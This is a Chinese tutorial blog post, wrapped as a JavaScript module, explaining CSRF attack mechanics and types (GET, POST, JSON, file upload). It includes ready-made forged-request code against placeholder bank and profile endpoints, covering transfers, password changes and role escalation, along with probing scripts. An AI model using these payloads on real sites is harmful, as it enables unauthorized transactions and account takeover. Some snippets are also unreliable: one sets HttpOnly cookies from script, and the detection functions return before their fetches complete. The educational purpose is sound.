const n=`---
title: "CSRF攻击与防护策略（一）- 攻击原理与类型"
excerpt: "跨站请求伪造（CSRF）是一种常见的Web安全漏洞，攻击者可以诱导用户在已认证的网站上执行非预期的操作。本文深入介绍CSRF攻击的原理、类型及其危害。"
coverImage: "/assets/blog/dynamic-routing/cover.jpg"
date: "2025-11-04"
author:
  name: 小羽
  picture: "/assets/blog/authors/jj.jpeg"
ogImage:
  url: "/assets/blog/dynamic-routing/cover.jpg"
---

# CSRF攻击与防护策略（一）：攻击原理与类型

## 前言

跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种常见的Web安全漏洞，攻击者可以诱导用户在已认证的网站上执行非预期的操作。这种攻击利用了用户对目标网站的信任，以及浏览器自动发送认证凭证（如cookies）的特性。本文将深入介绍CSRF攻击的原理、类型及其危害，帮助开发者理解这种攻击的本质，为后续的防护策略奠定基础。

## CSRF攻击原理

CSRF攻击的核心是利用用户在目标网站的认证状态，诱使用户发起非预期的请求。与XSS攻击不同，CSRF不需要攻击者注入恶意代码到目标网站，而是利用了浏览器的自动cookie发送机制。

### 攻击流程

\`\`\`javascript
// 1. 用户正常登录银行网站
// 银行网站设置认证cookie
document.cookie = "session_id=abc123; HttpOnly; Secure; SameSite=Strict";

// 2. 用户访问恶意网站（攻击者控制的网站）
// 恶意网站包含以下代码
const maliciousForm = document.createElement('form');
maliciousForm.method = 'POST';
maliciousForm.action = 'https://bank.example.com/transfer';
maliciousForm.style.display = 'none';

// 添加转账参数
const amountInput = document.createElement('input');
amountInput.type = 'hidden';
amountInput.name = 'amount';
amountInput.value = '1000';

const toAccountInput = document.createElement('input');
toAccountInput.type = 'hidden';
toAccountInput.name = 'toAccount';
toAccountInput.value = 'attacker_account';

maliciousForm.appendChild(amountInput);
maliciousForm.appendChild(toAccountInput);
document.body.appendChild(maliciousForm);

// 自动提交表单
maliciousForm.submit();

// 3. 浏览器自动发送认证cookie
// 请求头自动包含：
// Cookie: session_id=abc123

// 4. 银行服务器处理请求
// 由于请求包含有效的认证cookie，服务器认为这是合法请求
// 执行转账操作，将1000元转给攻击者账户
\`\`\`

### 攻击条件

CSRF攻击成功需要满足以下条件：

1. **用户已登录目标网站**：浏览器中保存了有效的认证凭证
2. **目标网站存在敏感操作**：如转账、修改密码、发布内容等
3. **敏感操作可通过HTTP请求触发**：不需要额外的用户交互或验证
4. **请求参数可预测**：攻击者能够构造有效的请求参数

\`\`\`javascript
// 检查网站是否容易受到CSRF攻击的示例
function checkCSRFVulnerability() {
  const sensitiveEndpoints = [
    '/api/transfer',
    '/api/change-password',
    '/api/update-profile',
    '/api/delete-account'
  ];
  
  const vulnerableEndpoints = [];
  
  sensitiveEndpoints.forEach(endpoint => {
    // 模拟CSRF攻击
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        // 测试参数
        test: 'csrf-test'
      })
    })
    .then(response => {
      // 如果请求成功（状态码2xx），可能存在CSRF漏洞
      if (response.ok) {
        vulnerableEndpoints.push(endpoint);
        console.warn(\`Potential CSRF vulnerability at \${endpoint}\`);
      }
    })
    .catch(error => {
      // 请求失败，可能已有防护
      console.log(\`Endpoint \${endpoint} appears to be protected\`);
    });
  });
  
  return vulnerableEndpoints;
}
\`\`\`

## CSRF攻击类型

CSRF攻击可以根据请求方式、攻击载体和目标系统分为多种类型。

### GET型CSRF

GET型CSRF是最简单的攻击形式，利用IMG标签、链接或其他自动发起GET请求的HTML元素。

\`\`\`html
<!-- 攻击者网站上的恶意代码 -->
<!-- 1. 使用IMG标签 -->
<img src="https://bank.example.com/transfer?toAccount=attacker&amount=1000" 
     style="display:none" alt="">

<!-- 2. 使用链接诱导用户点击 -->
<a href="https://bank.example.com/transfer?toAccount=attacker&amount=1000">
  点击领取免费礼品
</a>

<!-- 3. 使用script标签 -->
<script src="https://bank.example.com/api/delete-account"><\/script>

<!-- 4. 使用iframe -->
<iframe src="https://bank.example.com/transfer?toAccount=attacker&amount=1000" 
        style="display:none"></iframe>
\`\`\`

\`\`\`javascript
// 检测GET型CSRF漏洞的示例
function detectGETCSRFVulnerabilities() {
  const sensitiveGETEndpoints = [
    '/api/delete-user',
    '/api/transfer',
    '/api/change-password',
    '/api/logout'
  ];
  
  const vulnerabilities = [];
  
  sensitiveGETEndpoints.forEach(endpoint => {
    // 创建测试链接
    const testUrl = \`\${window.location.origin}\${endpoint}?test=csrf\`;
    
    // 检查是否有CSRF保护
    fetch(testUrl, {
      method: 'GET',
      credentials: 'include' // 包含认证cookie
    })
    .then(response => {
      if (response.ok) {
        vulnerabilities.push({
          type: 'GET_CSRF',
          endpoint,
          severity: 'high',
          description: \`GET endpoint \${endpoint} accepts state-changing requests without CSRF protection\`
        });
      }
    })
    .catch(error => {
      console.error(\`Error testing \${endpoint}:\`, error);
    });
  });
  
  return vulnerabilities;
}
\`\`\`

### POST型CSRF

POST型CSRF使用表单自动提交来发起POST请求，是更常见的CSRF攻击形式。

\`\`\`html
<!-- 攻击者网站上的恶意表单 -->
<form id="csrf-form" action="https://bank.example.com/transfer" method="POST" style="display:none">
  <input type="hidden" name="toAccount" value="attacker_account">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="description" value="Donation">
</form>

<script>
  // 页面加载后自动提交表单
  window.onload = function() {
    document.getElementById('csrf-form').submit();
  };
<\/script>

<!-- 或者使用JavaScript动态创建和提交表单 -->
<script>
  function createCSRFAttack() {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://bank.example.com/change-password';
    form.style.display = 'none';
    
    // 添加表单字段
    const fields = [
      { name: 'newPassword', value: 'attacker-controlled' },
      { name: 'confirmPassword', value: 'attacker-controlled' }
    ];
    
    fields.forEach(field => {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = field.name;
      input.value = field.value;
      form.appendChild(input);
    });
    
    document.body.appendChild(form);
    form.submit();
  }
  
  // 延迟执行，避免被检测
  setTimeout(createCSRFAttack, 1000);
<\/script>
\`\`\`

\`\`\`javascript
// 检测POST型CSRF漏洞的示例
function detectPOSTCSRFVulnerabilities() {
  const sensitivePOSTEndpoints = [
    '/api/transfer',
    '/api/change-password',
    '/api/update-profile',
    '/api/purchase'
  ];
  
  const vulnerabilities = [];
  
  sensitivePOSTEndpoints.forEach(endpoint => {
    // 创建测试数据
    const testData = {
      test: 'csrf-detection',
      timestamp: Date.now()
    };
    
    // 发送POST请求
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(testData),
      credentials: 'include' // 包含认证cookie
    })
    .then(response => {
      // 如果请求成功且没有CSRF错误，可能存在漏洞
      if (response.ok) {
        return response.json().then(data => {
          // 检查响应是否包含CSRF错误信息
          if (!data.error || !data.error.includes('CSRF')) {
            vulnerabilities.push({
              type: 'POST_CSRF',
              endpoint,
              severity: 'high',
              description: \`POST endpoint \${endpoint} accepts requests without CSRF protection\`
            });
          }
        });
      }
    })
    .catch(error => {
      console.error(\`Error testing \${endpoint}:\`, error);
    });
  });
  
  return vulnerabilities;
}
\`\`\`

### JSON型CSRF

随着现代Web应用越来越多地使用JSON API，JSON型CSRF攻击也变得常见。

\`\`\`html
<!-- 攻击者网站上的恶意代码 -->
<script>
  // 使用fetch发送JSON请求
  fetch('https://api.example.com/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      toAccount: 'attacker_account',
      amount: 1000,
      currency: 'USD'
    }),
    credentials: 'include' // 包含认证cookie
  })
  .then(response => response.json())
  .then(data => console.log('Transfer successful:', data))
  .catch(error => console.error('Transfer failed:', error));
<\/script>

<!-- 使用表单模拟JSON请求（某些情况下） -->
<form id="json-csrf" 
      action="https://api.example.com/transfer" 
      method="POST" 
      enctype="text/plain"
      style="display:none">
  <textarea name="json">
    {"toAccount": "attacker_account", "amount": 1000, "currency": "USD"}
  </textarea>
</form>

<script>
  document.getElementById('json-csrf').submit();
<\/script>
\`\`\`

\`\`\`javascript
// 检测JSON型CSRF漏洞的示例
function detectJSONCSRFVulnerabilities() {
  const jsonAPIEndpoints = [
    '/api/v1/transfer',
    '/api/v1/update-profile',
    '/api/v1/change-password',
    '/api/v1/purchase'
  ];
  
  const vulnerabilities = [];
  
  jsonAPIEndpoints.forEach(endpoint => {
    // 创建测试JSON数据
    const testJSON = {
      test: 'csrf-detection',
      timestamp: Date.now(),
      data: 'test-payload'
    };
    
    // 发送JSON请求
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(testJSON),
      credentials: 'include' // 包含认证cookie
    })
    .then(response => {
      // 检查响应状态和内容
      if (response.ok) {
        return response.json().then(data => {
          // 检查是否有CSRF保护错误
          if (!data.error || !data.error.toLowerCase().includes('csrf')) {
            vulnerabilities.push({
              type: 'JSON_CSRF',
              endpoint,
              severity: 'high',
              description: \`JSON API endpoint \${endpoint} accepts requests without CSRF protection\`
            });
          }
        });
      }
    })
    .catch(error => {
      console.error(\`Error testing \${endpoint}:\`, error);
    });
  });
  
  return vulnerabilities;
}
\`\`\`

### 文件上传型CSRF

文件上传型CSRF利用文件上传功能进行攻击，可能导致恶意文件上传或数据覆盖。

\`\`\`html
<!-- 攻击者网站上的恶意代码 -->
<form id="file-upload-csrf" 
      action="https://example.com/upload-avatar" 
      method="POST" 
      enctype="multipart/form-data"
      style="display:none">
  <input type="file" name="avatar" id="malicious-file">
  <input type="hidden" name="userId" value="victim-user-id">
</form>

<script>
  // 创建恶意文件内容
  const maliciousContent = new Blob(['<script>alert("XSS Attack");<\/script>'], 
                                   { type: 'image/svg+xml' });
  
  // 创建文件对象
  const maliciousFile = new File([maliciousContent], 'avatar.svg', 
                                 { type: 'image/svg+xml' });
  
  // 设置文件输入
  const fileInput = document.getElementById('malicious-file');
  
  // 使用DataTransfer API设置文件（绕过用户交互）
  const dataTransfer = new DataTransfer();
  dataTransfer.items.add(maliciousFile);
  fileInput.files = dataTransfer.files;
  
  // 自动提交表单
  window.onload = function() {
    document.getElementById('file-upload-csrf').submit();
  };
<\/script>
\`\`\`

\`\`\`javascript
// 检测文件上传型CSRF漏洞的示例
function detectFileUploadCSRFVulnerabilities() {
  const uploadEndpoints = [
    '/api/upload-avatar',
    '/api/upload-document',
    '/api/update-profile-picture'
  ];
  
  const vulnerabilities = [];
  
  uploadEndpoints.forEach(endpoint => {
    // 创建测试文件
    const testFile = new Blob(['test content'], { type: 'text/plain' });
    const formData = new FormData();
    formData.append('file', testFile, 'test.txt');
    formData.append('test', 'csrf-detection');
    
    // 发送文件上传请求
    fetch(endpoint, {
      method: 'POST',
      body: formData,
      credentials: 'include' // 包含认证cookie
    })
    .then(response => {
      // 如果上传成功，可能存在CSRF漏洞
      if (response.ok) {
        vulnerabilities.push({
          type: 'FILE_UPLOAD_CSRF',
          endpoint,
          severity: 'medium',
          description: \`File upload endpoint \${endpoint} accepts uploads without CSRF protection\`
        });
      }
    })
    .catch(error => {
      console.error(\`Error testing \${endpoint}:\`, error);
    });
  });
  
  return vulnerabilities;
}
\`\`\`

## CSRF攻击危害

CSRF攻击可能导致严重的安全问题，包括数据泄露、资金损失和权限提升等。

### 常见攻击场景

\`\`\`javascript
// 1. 金融交易攻击
function financialAttack() {
  // 攻击者诱导用户访问恶意网站
  // 恶意网站自动发起转账请求
  fetch('https://bank.example.com/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      toAccount: 'attacker_account',
      amount: 10000,
      description: 'Payment for services'
    }),
    credentials: 'include'
  });
}

// 2. 密码修改攻击
function passwordChangeAttack() {
  // 攻击者修改用户密码，夺取账户控制权
  fetch('https://example.com/api/change-password', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      currentPassword: 'guessed-or-leaked-password',
      newPassword: 'attacker-controlled-password',
      confirmPassword: 'attacker-controlled-password'
    }),
    credentials: 'include'
  });
}

// 3. 权限提升攻击
function privilegeEscalationAttack() {
  // 攻击者将用户账户提升为管理员
  fetch('https://example.com/api/update-user-role', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      userId: 'victim-user-id',
      newRole: 'admin'
    }),
    credentials: 'include'
  });
}

// 4. 数据篡改攻击
function dataTamperingAttack() {
  // 攻击者修改用户关键数据
  fetch('https://social.example.com/api/update-profile', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      email: 'attacker@example.com',
      phone: 'attacker-phone-number',
      bio: 'This account has been compromised'
    }),
    credentials: 'include'
  });
}
\`\`\`

### 攻击影响评估

\`\`\`javascript
// CSRF攻击影响评估工具
class CSRFImpactAssessment {
  constructor() {
    this.impactFactors = {
      financial: {
        weight: 0.4,
        indicators: ['transfer', 'payment', 'purchase', 'refund']
      },
      dataIntegrity: {
        weight: 0.3,
        indicators: ['update', 'modify', 'change', 'delete']
      },
      accountSecurity: {
        weight: 0.2,
        indicators: ['password', 'login', 'auth', 'session']
      },
      privacy: {
        weight: 0.1,
        indicators: ['profile', 'settings', 'preferences', 'visibility']
      }
    };
  }
  
  // 评估端点的CSRF风险
  assessEndpointRisk(endpoint, method, parameters) {
    let riskScore = 0;
    const riskFactors = [];
    
    // 分析端点路径和参数
    const endpointAnalysis = this.analyzeEndpoint(endpoint, method, parameters);
    
    // 计算各风险因子得分
    Object.entries(this.impactFactors).forEach(([factor, config]) => {
      const factorScore = this.calculateFactorScore(endpointAnalysis, config);
      riskScore += factorScore * config.weight;
      
      if (factorScore > 0.5) {
        riskFactors.push(factor);
      }
    });
    
    // 确定风险等级
    let riskLevel;
    if (riskScore >= 0.8) {
      riskLevel = 'critical';
    } else if (riskScore >= 0.6) {
      riskLevel = 'high';
    } else if (riskScore >= 0.4) {
      riskLevel = 'medium';
    } else if (riskScore >= 0.2) {
      riskLevel = 'low';
    } else {
      riskLevel = 'minimal';
    }
    
    return {
      endpoint,
      method,
      riskScore: Math.round(riskScore * 100) / 100,
      riskLevel,
      riskFactors,
      recommendations: this.generateRecommendations(riskLevel, riskFactors)
    };
  }
  
  // 分析端点
  analyzeEndpoint(endpoint, method, parameters) {
    const analysis = {
      path: endpoint.toLowerCase(),
      method: method.toUpperCase(),
      parameters: parameters.map(p => p.toLowerCase())
    };
    
    // 提取关键词
    analysis.keywords = [
      ...analysis.path.split('/'),
      ...analysis.parameters
    ].filter(Boolean);
    
    return analysis;
  }
  
  // 计算因子得分
  calculateFactorScore(analysis, config) {
    const matchingIndicators = config.indicators.filter(indicator =>
      analysis.keywords.some(keyword => keyword.includes(indicator))
    );
    
    // 基于匹配指标数量计算得分
    return Math.min(matchingIndicators.length / config.indicators.length, 1);
  }
  
  // 生成修复建议
  generateRecommendations(riskLevel, riskFactors) {
    const recommendations = [];
    
    // 基础CSRF防护
    recommendations.push({
      priority: 'high',
      action: 'Implement CSRF protection',
      details: 'Use synchronizer token pattern or double submit cookie pattern'
    });
    
    // 基于风险因子的特定建议
    if (riskFactors.includes('financial')) {
      recommendations.push({
        priority: 'critical',
        action: 'Add additional authentication for financial transactions',
        details: 'Require re-authentication, transaction signing, or 2FA for sensitive operations'
      });
    }
    
    if (riskFactors.includes('accountSecurity')) {
      recommendations.push({
        priority: 'critical',
        action: 'Secure account modification endpoints',
        details: 'Require password confirmation for account changes and implement rate limiting'
      });
    }
    
    if (riskFactors.includes('dataIntegrity')) {
      recommendations.push({
        priority: 'high',
        action: 'Implement data integrity checks',
        details: 'Add checksums or digital signatures for critical data modifications'
      });
    }
    
    if (riskFactors.includes('privacy')) {
      recommendations.push({
        priority: 'medium',
        action: 'Add privacy controls',
        details: 'Implement consent mechanisms and visibility controls for privacy changes'
      });
    }
    
    // 基于风险等级的建议
    if (riskLevel === 'critical' || riskLevel === 'high') {
      recommendations.push({
        priority: 'high',
        action: 'Implement real-time monitoring',
        details: 'Set up alerts for suspicious activities and implement anomaly detection'
      });
    }
    
    return recommendations;
  }
}

// 使用示例
const impactAssessment = new CSRFImpactAssessment();

// 评估不同端点的风险
const endpoints = [
  { endpoint: '/api/transfer', method: 'POST', parameters: ['toAccount', 'amount'] },
  { endpoint: '/api/update-profile', method: 'PUT', parameters: ['email', 'phone'] },
  { endpoint: '/api/change-password', method: 'POST', parameters: ['newPassword'] },
  { endpoint: '/api/view-profile', method: 'GET', parameters: ['userId'] }
];

endpoints.forEach(ep => {
  const assessment = impactAssessment.assessEndpointRisk(
    ep.endpoint, 
    ep.method, 
    ep.parameters
  );
  
  console.log(\`Endpoint: \${ep.endpoint}\`);
  console.log(\`Risk Level: \${assessment.riskLevel}\`);
  console.log(\`Risk Score: \${assessment.riskScore}\`);
  console.log(\`Risk Factors: \${assessment.riskFactors.join(', ')}\`);
  console.log('Recommendations:');
  assessment.recommendations.forEach(rec => {
    console.log(\`- [\${rec.priority.toUpperCase()}] \${rec.action}: \${rec.details}\`);
  });
  console.log('---');
});
\`\`\`

## 总结

CSRF攻击是一种严重的安全威胁，利用了用户对目标网站的信任和浏览器的自动cookie发送机制。了解CSRF攻击的原理和类型是构建有效防护体系的第一步。在下一篇文章中，我们将详细介绍各种CSRF防护策略及其实现方法，帮助开发者构建安全的Web应用。`;export{n as default};
//# sourceMappingURL=23-1-TG5nGttZ.js.map
